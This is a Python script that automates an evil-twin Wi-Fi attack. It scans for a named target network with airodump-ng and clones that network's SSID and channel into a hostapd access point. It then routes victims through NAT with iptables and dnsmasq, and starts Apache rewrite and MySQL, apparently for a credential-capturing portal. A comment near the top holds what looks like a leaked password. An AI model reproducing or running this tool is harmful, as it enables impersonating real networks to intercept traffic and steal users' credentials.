import subprocess
import os
import time
import csv
# import mysql.connector

#Kbm@11121220

def runShell():

    
    subprocess.call("sudo killall apt apt-get",shell=True)

    #first start with an update

    subprocess.call("sudo apt-get update", shell=True)

    subprocess.call("sudo apt-get install iptables", shell=True)

    print("Making sure all packages are updated.")

    #install dnsmasq if not already installed

    if os.popen("dnsmasq -v").read().find("Dnsmasq version") < 0:
        subprocess.call("sudo apt-get -y install dnsmasq", shell=True)
        print("Installing dnsmasq for DNS caching.")
    else:
        print("Dnsmasq is already installed")

    # install hostapd if not already installed

    if os.popen("hostapd -v").read().find("hostapd v2.10") < 0:
        subprocess.call("sudo apt-get install hostapd -y", shell=True)
        print("Installing Hostapd for creating entrypoint.")
    else:
        print("hostapd is already installed")


    #turn adapter to monitor mode

    subprocess.call("sudo airmon-ng start wlan0",shell=True)

    targetNetwork = input("Enter the target network name (Case Sensitive)")

    #scan for access points with a Wi-Fi capture
    #subprocess.call("sudo cat output-01.csv",shell=True)

    p = subprocess.Popen(['sudo','airodump-ng','--essid',targetNetwork,'--write' ,'output', 'wlan0mon'])

    #end scanning after 5 seconds

    time.sleep(5)
    p.kill()

    #Read generated csv file and

    file = open("output-02.csv")
    csvReader = csv.reader(file)

    rows = []
    for row in csvReader:
        rows.append(row)

    networkChannel = rows[2][3].replace(" ", "")


    #populate hostapd conf file with desired network information

    subprocess.call(f"sudo sed -i '5s/ssid=/ssid={targetNetwork}/' hostapd.conf",shell=True)
    subprocess.call(f"sudo sed -i 's/channel=/channel={networkChannel}/' hostapd.conf", shell=True)

    #make sure rewrite is enabled
    subprocess.call("sudo a2enmod rewrite",shell=True)

    subprocess.call("sudo service mysql start", shell=True)

    #DEPLOYMENT

    #give interface gateway
    subprocess.call("sudo ifconfig wlan0mon up 10.0.0.1 netmask 255.255.255.0",shell=True)

    #add route table
    subprocess.call("sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1",shell=True)

    #call our iptablerules
    subprocess.call("sudo iptables --flush",shell=True)
    subprocess.call("sudo iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE ",shell=True)
    subprocess.call("sudo iptables --append FORWARD --in-interface wlan0mon -j ACCEPT ",shell=True)
    subprocess.call("sudo iptables -t nat -A POSTROUTING -j MASQUERADE",shell=True)
    subprocess.call("sudo sysctl -w net.ipv4.ip_forward=1",shell=True)


    #turn on access point
    print("TEsT" + os.getcwd())
    subprocess.Popen(['sudo', 'hostapd' ,'hostapd.conf'], cwd=os.getcwd())
    print("TEST")
    #turn on dnsmasq
    subprocess.call("sudo dnsmasq -C dnsmasq.conf -d", shell=True)









    #reset conf attributes
    subprocess.call(f"sudo sed -i '5s/ssid={targetNetwork}/ssid=/' hostapd.conf",shell=True)
    subprocess.call(f"sudo sed -i '9s/channel={rows[2][3]}/channel=/' hostapd.conf", shell=True)

if __name__ == '__main__':
    runShell()
